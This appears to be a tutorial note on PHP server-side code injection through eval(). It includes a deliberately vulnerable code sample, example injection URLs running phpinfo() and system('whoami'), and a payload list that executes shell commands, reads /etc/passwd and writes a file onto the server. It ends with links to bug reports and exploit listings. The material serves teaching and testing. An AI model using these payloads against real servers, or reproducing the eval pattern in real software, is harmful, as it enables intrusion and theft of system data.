# Server Side Code Injection (PHP) 
Code injection is the embedding of code into software, which disturbs the functioning of the software. The code introduced to the software can disturb the database integrity, security, features, etc.

PHP code injection is a vulnerability that allows an attacker to inject custom code into the server side scripting engine. This vulnerability occurs when an attacker can control all or part of an input string that is fed into an eval() function call. Eval will execute the argument as code.

Code Injection differs from Command Injection in that an attacker is only limited by the functionality of the injected language itself. If an attacker is able to inject PHP code into an application and have it executed, they are only limited by what PHP is capable of. Command injection consists of leveraging existing code to execute commands, usually within the context of a shell

##### Posiblity of attack
  These types of attacks are usually made possible due to a lack of proper input/output data validation, for example:

  • allowed characters (standard regular expressions classes or custom)

  • data format

  • amount of expected data
  
 ### Example
       //The URL to access this https://www.example.com/index.php?id=1
        $id = "idnumber";
        $x = $_GET['id'];
        eval("\$id = \$x;");
        
  ###### In this web application, there is no input validation.

  ###### https://www.example.com/index.php?id=1; phpinfo()

  ###### The above URL will show all the info about the PHP version.

  ###### An attacker can execute system commands by requesting the below URL.

  ###### https://www.example.com/index.php?id=1; system(‘whoami’)

  ###### The above URL will show the output of the command
  
  While exploiting bugs like these, an attacker may want to execute system commands. In this case, a code injection bug can also be used for command injection, 
   for example: /index.php?arg=1; system('id')

  ## PHP Code Injection Payloads
  
    system('id')
    exec('id')
    shell_exec('id')
    passthru('id')
    exec('id')
    `id`
    echo `id`
    readfile('/etc/passwd')
    file_get_contents('/etc/passwd')
    pcntl_exec("id")
    $file = fopen("test1.txt", "w"); echo fwrite($file, "hello world"); fclose($file);
    $file = fopen("phpinfo.php", "w"); echo fwrite($file, "<?php phpinfo() ?>"); fclose($file);


### PHP Code Injection Report

  Reported by [egix](https://hackerone.com/egix)

  Reported to [Invision Power Services, Inc.](https://hackerone.com/ips)

  https://hackerone.com/reports/1092574
  
  
  Reported by [cutoffurmind](https://hackerone.com/cutoffurmind)

  Reported to [Mail.ru](https://hackerone.com/mailru)

  https://hackerone.com/reports/798135
    
### Example CVE

  - https://www.exploit-db.com/exploits/40027
				
  - https://www.exploit-db.com/exploits/38569

  - https://www.exploit-db.com/exploits/38547

  - https://www.exploit-db.com/exploits/38543
  
### References

  1. [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
  
  2. [Cobalt PHP Code Injection](https://cobalt.io/blog/a-pentesters-guide-to-code-injection)
    
